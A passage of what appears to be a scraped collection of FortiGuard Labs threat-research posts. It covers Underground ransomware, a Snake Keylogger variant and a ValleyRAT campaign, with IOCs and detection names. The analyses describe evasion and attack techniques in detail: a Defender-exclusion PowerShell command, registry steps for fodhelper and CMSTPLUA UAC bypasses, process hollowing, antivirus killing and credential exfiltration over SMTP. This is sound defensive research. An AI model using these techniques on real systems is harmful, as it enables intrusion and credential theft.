e346f6b36569d7b8c52a55403a6b78ae0ed15c0aaae4011490404bdb04ff28e58e43c97e5bc62211b3673dee13e376a1f5026502ebe9fd9f7f455dc17c253b7fae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a7a9826be22b6d977d6a0e5179f84d8e88b279fe6d9df8f6c93ebc40a6ba70f0618459be33cd4f59081098435a0fbaa649f301f985647a75d21b7fc337378e59b6e7313b6aa37a00b602e620a25a0b71a74503ea967f1814c6c7b8b192535a043222dd76c461e70c3cb330bacfcf465751b07331c4f8a4415c09f4cd7c4e6fcd96e7313b6aa37a00b602e620a25a0b71a74503ea967f1814c6c7b8b192535a043 infostealer,security attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/emansrepo-stealer-multi-vector-attack-chains"
  },
  {
    "title": "Ransomware Roundup - Underground",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Underground ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The first sample of Underground ransomware was first observed in early July 2023, on a publicly available file scanning site. This roughly coincides with the timing of the first victim posted on its data leak site on July 13, 2023. Like most ransomware, this ransomware encrypts files on victims' Windows machines and demands a ransom to decrypt them via dropped ransom notes. Online reports indicate that the Russia-based RomCom group, also known as Storm-0978, is deploying the Underground ransomware. This threat group is known to exploit CVE-2023-36884 (Microsoft Office and Windows HTML RCE Vulnerability), which could be the infection vector for the ransomware. FortiGuard Labs published an Outbreak Alert on CVE-2023-36884 on July 13, 2024. The group may also use other common infection vectors such as email and purchasing access from an Initial Access Broker (IAB). Once executed, the Underground ransomware deletes shadow copies with the following command: The ransomware sets the maximum time that a RemoteDesktop/TerminalServer session can remain active on the server to 14 days (14 days after the user disconnects) using the following command: It then stops the MS SQL Server service with the following command: The ransomware then creates and drops a ransom note named “!!readme!!!.txt”: While the ransomware encrypts files, it does not change or append file extensions. It also avoids encrypting files with the following extensions: .sys .exe .dll .bat .bin .cmd .com .cpl .gadget .inf1 .ins .inx .isu .job .jse .lnk .msc .msi .mst .paf .pif .ps1 .reg .rgs .scr .sct .shb shs .u3p .vb .vbe .vbs .vbscript .ws .wsh .wsf The ransomware creates and executes temp.cmd, which performs the following actions: The Underground ransomware has a data leak site that posts victim information, including data stolen from victims. Currently, the data leak site lists 16 victims, with the most recent victim posted on July 3, 2024. Below is a breakdown of the victims and their verticals: Post Date Location of Victim Vertical 2024/07/03 USA Construction 2024/07/01 France Pharmaceuticals 2024/06/17 USA Professional Services 2024/05/27 USA Banking 2024/05/15 USA Medicine 2024/05/01 USA Industry 2024/04/09 USA Business Services 2024/04/09 USA Construction 2024/03/25 USA Manufacturing 2024/03/06 Korea Manufacturing 2024/02/12 Spain Manufacturing 2024/02/02 Germany Industry 2023/07/31 Slovakia Business Services 2024/07/18 Taiwan Industry 2024/07/18 Singapore Manufacturing 2024/07/14 Canada Manufacturing The data leak site also includes a drop-down box with a list of industries that the ransomware group is targeting or is allowed to target. The Underground ransomware group also has a Telegram channel that was created on March 21, 2024. According to the Telegram channel, the ransomware group has made victims' stolen information available on Mega, a cloud storage service provider that is being abused. The Underground ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Please read the outbreak alert for protection against the potential infection vector (CVE-2023-36884) abused by the Underground ransomware: Underground Ransomware File IOCs SHA2 Note 9543f71d7c4e394223c9d41ccef71541e1f1eb0cc76e8fa0f632b8365069af64 Underground ransomware 9f702b94a86558df87de316611d9f1bfe99a6d8da9fa9b3d7bb125a12f9ad11f eb8ed3b94fa978b27a02754d4f41ffc95ed95b9e62afb492015d0eb25f89956f 9d41b2f7c07110fb855c62b5e7e330a597860916599e73dd3505694fd1bbe163 cc80c74a3592374341324d607d877dcf564d326a1354f3f2a4af58030e716813 d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-underground"
  },
  {
    "title": "Deep Analysis of Snake Keylogger’s New Variant",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from the victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently caught a phishing campaign in the wild with a malicious Excel document attached to the phishing email. We performed a deep analysis on the campaign and discovered that it delivers a new variant of Snake Keylogger. Snake Keylogger (aka “404 Keylogger” or “KrakenKeylogger”) is a subscription-based keylogger with many capabilities. It is a .NET-based software originally sold on a hacker forum. Once executed on a victim’s computer, it has the ability to steal sensitive data, including saved credentials from web browsers and other popular software, the system clipboard, and basic device information. It can also log keystrokes and capture screenshots. In the following sections, we will look at the phishing spam, how it lures the recipient into opening a malicious Excel document, how the Excel document downloads and executes a new variant of Snake Keylogger, and what anti-analysis techniques it uses to protect itself from being detected and blocked during the attack. The email content in Figure 1 attempts to deceive the recipient into opening the attached Excel file (swift copy.xls) by claiming that funds have been transferred into their account. To warn the user, the FortiGuard service marks this phishing email as “[virus detected],” as shown in the subject line. Figure 2 shows the content of the attached Excel file when opened in the Office Excel program. Meanwhile, malicious code is executed in the background to download other files. Looking into the binary data of the Excel file, it contains a specially crafted embedded link object that exploits theCVE-2017-0199vulnerability to download a malicious file. Figure 3 displays the embedded link object (“\\x01Ole”). The link is “hxxp[:]//urlty[.]co/byPCO,” which is secretly requested by the Excel program when the file is opened. When the link is accessed, it returns with another URL in the “Location” field of the response header, which is “hxxp[:]//192.3.176[.]138/xampp/zoom/107.hta”.  HTA file is an HTML Application file executed by a Windows application— by default, the HTML Application host (mshta.exe). The 107.hta file is full of obfuscated JavaScript code that is executed automatically when loaded by mshta.exe. Figure 4 shows a partial view of the JavaScript code. After decoding and de-obfuscating the JavaScript code, we were able to get a piece of the VBScript code, as shown in Figure 5. It’s evident that the VBScript code created an object of “Script.Shell” and executed a piece of PowerShell code decoded from a base64 string, defined in the variable “ps_code”. This PowerShell code is then executed by “cmd.exe” (%ComSpec%) when the “shellObj.Run()” function is called. The base64 decoded PowerShell code is shown below. It invokes a Windows API, URLDownloadToFile(), to download an executable file to the victim’s computer and run it after waiting three seconds. The URL of the executable file is hardcoded as “hxxp[:]//192.3.176[.]138/107/sahost.exe” and the local file is “%Appdata%\\sahost.exe”. The PowerShell code finally starts the executable file by callingStart “$Env:AppData\\sahost.exe”. My research shows that the downloaded EXE file (sahost.exe) contains a new variant of Snake Keylogger, which is extracted, decrypted, loaded, and run by the EXE file. I will refer to this downloaded EXE file as the Loader module. Figure 6 is a screenshot of its analysis in a packer detection tool. It was developed using the Microsoft .Net Framework. To protect the Snake Keylogger core module from being detected and blocked by cybersecurity products, sahost.exe uses multiple-layer protection techniques, like transformation and encryption, within several named resources. When sahost.exe starts, it extracts several modules (dlls) onto its memory from the Resource section that provide methods to inquire, extract, decrypt, install, and deploy the core module. The original name of “sahost.exe” is “utGw.exe.” It decrypts and extracts a module called “FGMaker.dll” from a resource named “siri” in its Resource section. Figure 7 shows some of that code. The “FGMaker.dll” module extracts additional modules (such as “Q” and “Gammar.dll”) that work together to extract and decrypt a module called “Tyrone.dll” from the resource “KKki”. You may have noticed in Figure 8 that it loads “KKki” as a Bitmap resource. The module “Tyrone.dll” was encrypted, broken down into bytes, and kept in the Bitmap resource. Figure 9 shows the content of the resource “KKki” as a Bitmap picture. After another decryption sequence, we can see the plaintext of the “Tyrone.dll” module in memory. It is then loaded as an executable module by calling the Assembly.Load() method. Figure 10 showcases the modules that have been extracted and loaded by the Loader module so far. I will refer to “Tyrone.dll” as “Deploy module” in the following analysis. It performs the following functions: This checks whether the current process’s full path is \"% AppData%WeENKtk.exe,\" renames it, and sets attributes (Hidden, ReadOnly, System, etc.) to it if the result is no. On the very first run, it was %AppData%sahost. exe. The Deploy module runs the “schetasks.exe” command to create a new scheduled task in the system Task Scheduler. This allows Snake Keylogger to launch at system startup. Figure 11 shows the scheduled task for Snake Keylogger. The Deploy module obtains a resource data, “I7O14IyvsdO,” from its own Resource section. Then, it decrypts the data with the string key “YRDdITlYRXI” into a final PE file in its memory. This is the core module of Snake Keylogger. Next, the Deploy module performs process hollowing, a malware technique that creates a new process and then inserts malicious code into it to run. This allows it to hide its original process. Figure 12 shows that it about to call the obfuscated API CreateProcess(). It has a key argument, “Creation Flag,” indicating how to create the process. Its value has been set to 134217732, i.e. 0x08000004 in hexadecimal. It is defined as “CREATE_SUSPENDED” and “CREATE_NO_WINDOW.” The process name, the first argument to CreateProcess(), is the same as the Loader module. To complete the process hollowing, it needs to call some relevant Windows APIs, such as ZwUnmapViewOfSection(), VirtualAllocEx(), ReadProcessMemory(), WriteProcessMemory(), GetThreadContext(), SetThreadContext(), and ResumeThread(). The core module's original name is “lfwhUWZlmFnGhDYPudAJ.exe.” Figure 13 shows that the attacker has fully obfuscated the entire module, which displays its entry point (“Main()”) and the obfuscated code, class names, and method names. The Snake Keylogger's structure is very clear. We can see its capability to collect private and sensitive information from the victim’s device, including the device’s basic information, saved credentials, keystrokes, screenshots, and data on the system clipboard. The features are split into different methods driven by Timers. Snake Keylogger also has some relevant flag variables indicating whether the feature is enabled. This variant of Snake Keylogger only enables the credential collection feature. First, Snake Keylogger fetches the device’s basic information, like the PC name, System time, IP address, Country name, Region name, City name, TimeZone, and so on. Figure 14 shows an example of the basic information collected from one of my testing devices. This Snake Keylogger variant includes several hardcoded IP addresses the attacker may believe are used by some sample automatic analysis systems they want to avoid. One method called “anti_bot(),” shown in Figure 15, checks the hardcoded IP addresses. “BotDetected” is returned if the victim’s IP address matches any of those IP addresses. This results in the Snake Keylogger only collecting credentials but never sending them to the attacker. Snake Keylogger collects saved credentials from over 50 popular software programs, categorized as web browsers, email clients, IM clients, and FTP clients. Every software has its own profile folder for saving configuration data. Snake Keylogger traverses all the profile files, looking for the saved credentials. Figure 16 is an example of the method used for Google Chrome. As you may have noticed in the “Locals” tab, it just obtained one set of credentials, including “URL,” “Login ID,” and “Login Password.” All the software can be categorized as follows: Chromium-based Web Browsers:\"Google Chrome,\" \"Amigo,\" \"Xpom,\" \"Kometa,\" \"Nichrome,\" \"CocCoc,\" \"QQ Browser,\" \"Orbitum,\" \"Slimjet,\" \"Iridium,\" \"Vivaldi,\" \"Iron,\" \"Chromium,\" \"Ghost Browser,\" \"Cent Browser,\" \"xVast,\" \"Chedot,\" \"Comodo Dragon,\" \"SuperBird,\" \"360 Browser,” \"360 Chrome,” \"Brave,\" \"Torch,\" \"UC Browser,\" \"Blisk,\" \"Epic PrivacyBrowser,\" \"Liebao,\" \"Avast,\" \"Kinza,\" \"BlackHawk,\" \"Citrio,\" \"Uran,\" \"Coowon,\" \"7Star,” \"QIP Surf,” \"Sleipnir,” \"Chrome Canary,” \"ChromePlus,” \"Sputnik,” \"Microsoft Edge,\" and \"Slim\". Mozilla-based Web Browsers:\"SeaMonkey,” \"IceDragon,” \"CyberFox,” \"WaterFox,” \"Postbox,” and \"PaleMoon\" Other Web Browsers:\"Opera,” \"Firefox\". Email clients:\"FoxMail,” \"Thunderbird\". FTP clients:\"FileZilla\". IM client:\"Pidgin,” \"Discord\". All the credentials collected from the above software are temporarily stored in a global variable. Snake Keylogger variants have several ways to submit harvested credentials to the attacker, including uploading the data onto an FTP server, sending it to an email address, and submitting it over Telegram’s bot over HTTP Post method.  This variant of Snake Keylogger sends data over SMTP. Figure 17 is a screenshot of how it builds the email content. The upper part contains the code that includes the email’s sender, recipient, subject, and body, while the lower part shows the content of the variable “mailMessage” with the data filled by the code. The email’s body contains the computer's basic information saved in a global variable, followed by the credentials stolen from the victim’s computer saved in another global variable. It then creates an SMTP client, and its Send() method is called to send the credentials to the attacker. Figure 18 shows an example of how the email looks in Microsoft Outlook. Figure 19 illustrates the entire workflow of the Snake Keylogger campaign. This analysis reviewed the entire process of this Snake Keylogger campaign, which is being led by a phishing email. The phishing email, which included a malicious Excel document, lured the recipient into opening the file to see the details of a “balance payment.” The Excel document was displayed in different tools, and I explained how it downloads an HTA file by exploiting a known vulnerability. It then leverages multiple language scripts, such as JavaScript, VBScript, and PowerShell, to download the Snake Keylogger’s Loader module. Afterward, I elaborated on how the Loader module extracts multiple modules (including several middle modules and the Deploy module) from the file’s Resource section. Malware often uses a process like this to prevent being detected and analyzed. Next, I introduced how the Snake Keylogger Deploy module establishes persistence on the victim’s computer and conducts process hollowing to put the core module into a newly created process to run. Finally, we examined how the Snake Keylogger steals sensitive information from the victim’s computer and how the stolen data is sent to the attacker using the SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus service detects the attached Excel document, 107.hta, the downloaded executable file and the extracted Snake Keylogger with the following AV signatures. MSExcel/CVE_2017_0199.DDOC!exploitVBS/SnakeKeylogger.119B!tr.dldrMSIL/SnakeKeylogger.FQQD!trMSIL/SnakeKeylogger.AES!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeFortinet Cybersecurity Fundamentals (FCF) training, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://urlty[.]co/byPCOhxxp[:]//192.3.176[.]138/xampp/zoom/107.htahxxp[:]//192.3.176[.]138/107/sahost.exe [swift copy.xls]8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7 [107.hta]6F6A660CE89F6EA5BBE532921DDC4AA17BCD3F2524AA2461D4BE265C9E7328B9 [The Loader module/sahost.exe / WeENKtk.exe / utGw.exe]484E5A871AD69D6B214A31A3B7F8CFCED71BA7A07E62205A90515F350CC0F723 [Snake Keylogger core module / lfwhUWZlmFnGhDYPudAJ.exe]207DD751868995754F8C1223C08F28633B47629F78FAAF70A3B931459EE60714 FortiGuards Labs,limitless keylogger,keylogger FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/deep-analysis-of-snake-keylogger-new-variant"
  },
  {
    "title": "A Deep Dive into a New ValleyRAT Campaign Targeting Chinese Speakers",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium FortiGuard Labs recently encountered an ongoing ValleyRAT campaign specifically targeting Chinese speakers. This malware has historically targeted e-commerce, finance, sales, and management enterprises. ValleyRAT is a multi-stage malware that utilizes diverse techniques to monitor and control its victims and deploy arbitrary plugins to cause further damage. Another noteworthy characteristic of this malware is its heavy usage of shellcode to execute its many components directly in memory, significantly reducing its file footprint in the victim’s system. This blog provides a technical analysis of this campaign. This malware uses icons of legitimate applications, including Microsoft Office, with filenames related to financial documents similar to the following: To make the lure more believable to the user, it creates an empty file%TEMP%\\dome.docand executes the default application for opening Microsoft Office Word documents. If no default application is set, it shows an error message box with the text, “Open The Document Fail.” Upon execution, it attempts to create a mutex namedTESTto ensure that only one instance of the malware process is running on the system. After that, it deletes the following registry entries, which could have been added in a previous installation of the malware: It then stores the IP and the port of the Command and Control (C2) in the following registry entry: IpDateInfo = “|i:154.82.85.12|p:5689|” Before continuing, it determines if it’s running under a virtual machine by enumerating all services and checking if any of the following VM-related strings are on the service display names: If any of these services are found, a blank error message box is shown before it terminates. Before the shellcode is executed to load the next stage, this malware uses a known technique called sleep obfuscation to evade memory scanners. This involves adding a callback functionality to Sleep or similar APIs that modify the permissions of the allocated memory where the malicious code resides to values not commonly deemed suspicious by scanners. Furthermore, during this process, the malicious shellcode is encoded with a simple XOR operation to evade pattern-based signatures. After decoding the malicious shellcode using XOR with a single-byte key,0x60in this case, it copies the first 0xc bytes from the Sleep API function and stores it for later use. It then replaces it with code that will lead to executing the malicious callback function. This callback function changes the permission of the malicious shellcode and attempts to obfuscate it using the following procedure: In general, this malware uses shellcode blocks to run its components directly in memory. This shellcode is similar to the one shared in this GitHub repository:https://github.com/killeven/DllToShellCode/blob/master/DllToShellCode/shellcode_data.c. This specific shellcode has also been seen in older malware campaigns and detected by Fortinet as W64/Agent.CCF!tr. Once this malware has finished initializing, it decrypts a shellcode with the AES-256 algorithm using a key derived from a hardcoded 16-byte value. The result is then XOR-ed with0x60to reveal the final shellcode. It then triggers the previously mentioned sleep obfuscation routine by calling the Sleep API before finally executing the shellcode by using it as a callback procedure for theEnumSystemLocalesAAPI. The shellcode uses a hashing algorithm called BKDR to obfuscate the API names, which are then used to search for the target APIs by directly traversing the Process Environment Block (PEB). After checking standard 64-bit PE characteristics from the payload, the shellcode reflectively loads the embedded DLL, in this case, the beaconing module, by copying it to another memory location, adjusting its base relocation, and manually resolving its imports before its entry point is executed. The beaconing module is responsible for loading the RuntimeBroker and RemoteShellcode components. It also allows the malware to persist and gain administrator privileges in the system while ensuring that no AV-related processes are running before it starts communicating with its C2 server. This malware adds a scheduled task to allow its component,Loader- discussed in a later section – to execute automatically upon user login. Furthermore, for theLoadercomponent to be executed with high privilege without triggering Windows’ UAC, it employs a known technique that abuses the auto-elevate properties of the legitimate applications,C:\\Windows\\System32\\zh-CN\\eventvwr.mscorC:\\Windows\\System32\\CompMgmtLauncher.exe.  By design, these applications eventually lead to the execution of the current default value set on the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Command, which will be set to the path of theLoadercomponent in a later stage of infection. It attempts to evade detection from Microsoft Windows Defender by adding the root drive of the malware path to the exclusion by executing the following PowerShell command: Invoke-Command -Command {Add-MpPreference -ExclusionPath {drive} Instead of usually running the command as an argument to the PowerShell process, it uses pipes to communicate with a newly created PowerShell process to execute commands. This could be an attempt to evade AV products that inspect suspicious process arguments. By default, it adds the common root drive \"C:\\\" to the list of excluded paths. If the malware was executed from another root drive, it will also be added to the list. It then proceeds to kill AV-related processes containing the following executable filenames: Notably, the executable names listed are components of products developed by Chinese companies reaffirming their target preference. To determine if the processes have been successfully terminated, it does another scan of the running processes to check if any process with the following executable filenames is still running: If any of these processes are still running, it performs another attempt to kill them by injecting a shellcode with an embedded DLL into a runninglsassprocess. This DLL performs the following procedures: Once the AV processes are no longer running, it modifies the following AV product settings in the registry to disable their autostart and/or reduce their effectiveness: If the AV programs are still found running, the malware process displays an “ERROR” message box and terminates. If the user has administrator privileges, it attempts to execute a new process of itself with elevated privileges without prompting Windows’ UAC(User Access Control) security feature using two known methods. The first method involves abusing the CMSTPLUA COM class, specifically theShellExecmethod of the ICMLuaUtil interface. Since the system automatically grants this class elevated privileges, any process executed using this interface will gain the same. Before using the interface to execute a new process of itself, it attempts to disguise itself as a legitimate explorer.exe process by locating the ProcessParameters structure in the Process Environment Block (PEB) and replacing its ImagePathName and CommandLine fields with the path of the legitimate explorer.exe. The second method exploits another legitimate application called fodhelper.exe.Like the first method, this executable gets high privilege upon execution. First, it creates the registry keyHKCU\\Software\\Classes\\.pwn\\Shell\\Open\\commandand sets its default value to the malware path. Next, it creates another registry key, HKCU\\Software\\Classes\\ms-settings\\CurVer, and sets its default value data to .pwn, associating it with the previously created malicious registry entry. Finally, it executes the legitimate fodhelper.exe, which executes whatever ProgID is defined in the CurVer subkey. This leads to the execution of the malware with high privilege. At this stage, the malware initiates its communication with its C2 to request other components needed for the next stages of the infection. Prior to this, it checks for internet connectivity by attempting to connect to the legitimate Chinese search engine,http://www.baidu.com. The requests sent by this malware at this stage are all in plaintext, but the responses from the C2 are encoded with a randomly generated single-byte XOR key, except for the requests to get the component sizes. This key is included in the malware’s requests in the format{request}_{xor key}. There are three possible configurations with the malware request methods to the C2 and its corresponding procedure for storing and executing succeeding components in the system. In the specific sample we analyzed, it is configured to request two shellcode blocks from its C2: internally namedRemoteShellcodeandRuntimeBroker.To do this, it determines the sizes of the shellcode blocks by sendingGetRemoteShellcodeSize_{xor key}andGetRuntimeBrokerSize_{xor_key}. The sizes received from the C2 are used to check the integrity of the shellcode upon receipt. After that, the C2 sends the shellcode encoded with the XOR key included in the malware’s requests. A traffic example is provided in the image below: RemoteShellCodeandRuntimeBrokerare decoded and injected into newly created processes of legitimate Windows applications C:\\Windows\\System32\\colorcpl.exe and C:\\Windows\\System32\\cleanmgr.exe, respectively. The functions for these components are detailed in the next sections. Meanwhile, the second method is like the first in that they both request two components from the C2—this time, they arewwlib.dll andWinword.exe.While the previous method’s execution of the components takes place in-memory, this method involves writing the components to the disk. Like the previous method, it also requests the sizes of the components. For the size ofwwlib.dll, it sendsGetWwlibSize_{xor key}.Although the sample we analyzed does not contain the request string for retrieving the size ofWinword.exe,extrapolating from the analysis of the first method, it can be assumed that it could sendGetWinWordSize_{xor key}beforehand.After the sizes have been determined, it sendsGetWWlib_{xor key}andGetWinWord_ {xor key}to receive the binaries, which are then written to the%UserProfile%directory.It then executesWinword.exe.Based on other reports,Winword.exeis a legitimate Microsoft Office Word executable, which would then be executed, inadvertently loading the maliciouswwlib.dllupon execution. Finally, the last method sendsGetOnline_{xor key}to download an executable file, which is then saved asalgbg.exein the%UserProfile%directory. It could sendGetOnlineSize_{xor key}to get the executable size beforehand. This shellcode loads and executes a DLL whose primary purpose is downloading a component namedLoaderfrom the C2 server. The DLL sends the request stringsGetLoaderSize_{xor key}andGetLoader_{xor key}to the C2, which responds with the size and the requested executable file, respectively. This file is then saved asLoader.exein the%USERPROFILE%directory.After dropping the executable file, it sets the default value of the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Commandto the said file path. This is to complete the autostart mechanism partially set up by the beaconing module mentioned earlier. This effectively allows the newLoadercomponent to run automatically when the user logs in. At the time of analysis, theLoadercomponent received from the C2 has the same function as the first-stage loader, which is to execute the beaconing module. We can see in the figure below that the WinMain of the first-stageLoaderis very similar to theWinMainof the newerLoaderexecutable from the C2. Fortinet detects these variants asW64/RCShell.A!tr. Setting aside the striking similarities, this new component has a few behaviors outside the first-stage loader, as detailed below. It attempts to detect if it is running inside a sandbox system by counting the files inside the%TEMP%directory. This malware terminates if the number of temporary files is less than 30. Since these systems are restored after every test, they usually have fewer temporary files than conventional systems. To continue execution, it makes sure that any of the following registry keys related to popular communication applications in China are found in the system, further confirming our belief that this malware specifically targets Chinese systems: While the first-stage loader uses the AES-256 algorithm to encrypt the shellcode, an interesting method this malware uses in other samples is to disguise the payload within the malware body by keeping them as UUID strings or IP addresses and then converting these benign-looking strings into their hex-byte equivalent to form the shellcode. The primary purpose of this component is to request the downloader of the ValleyRAT payload. In addition, it contains the embedded configuration marked with the string “codemark” for the payload to use during its execution at a later stage. This configuration is very similar to the previously reported ValleyRat campaigns, where it contains the latest C2 servers as well as other settings for the RAT. To request the payload downloader, it sends the string 64 or 32, depending on the system’s architecture. As shown in the image below, the C2 responds with the payload downloader encoded with XOR, where the key is derived by adding 0x36 to a 10-byte value from the C2's response. Similar to how the earlier components are loaded, the shellcode reflectively loads the embedded payloader DLL and executes its export namedloadwhile passing the previously mentioned configuration as an argument. We detect this component asW64/ValleyRat.A!tr.spy.The C2 configuration from the previous module is decoded by simple string reverse, which is then parsed to configure the downloader. Depending on the configuration, it uses UDP or TCP sockets to connect to the C2 and receive the final payload. First, it will send the size and the key for encrypting the payload, to which the C2 responds with the encoded SHA256 hash of the payload. Lastly, it sends登录模块.dll_bin(translated asLogin module.dll_bin) to request the ValleyRAT malware. A shellcode with the embedded ValleyRAT DLL is then decoded using the same method used to decode the payload downloader. This shellcode is stored in the registry valued33f351a4aeea5e608853d1a56661059on keyHKEY_CURRENT_USER\\Console\\1. Upon execution of the shellcode, the ValleyRAT DLL is reflectively loaded and executed in the system. This relatively new RAT is attributed to the suspected APT group “Silver Fox”. This malware's capabilities are focused on graphically monitoring the user's activities and delivering other plugins and possibly other malware to the victim system. These are the commands supported by this variant: In this article, we have detailed an elaborate and ongoing ValleyRAT campaign specifically targeting Chinese systems. This malware involves several components loaded in different stages and mainly uses shellcode to execute them directly in memory, significantly reducing its file trace in the system. Once the malware gains a foothold in the system, it supports commands capable of monitoring the victim's activities and delivering arbitrary plugins to further the threat actors’ intentions. FortiGuard Labs will continue to monitor this ongoing campaign. FortiGuard AntiVirus detects the malicious files identified in this report as The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. FortiEDR detects the malicious event and is detected by the “Unmapped Executable” rule within the “Exfiltration Prevention” security policy. The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date. We also suggest that organizations have their end users undergo our free NSE training:NSE 1 – Information Security Awareness. It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 154[.]82[.]85[.]12154[.]92[.]19[.]81 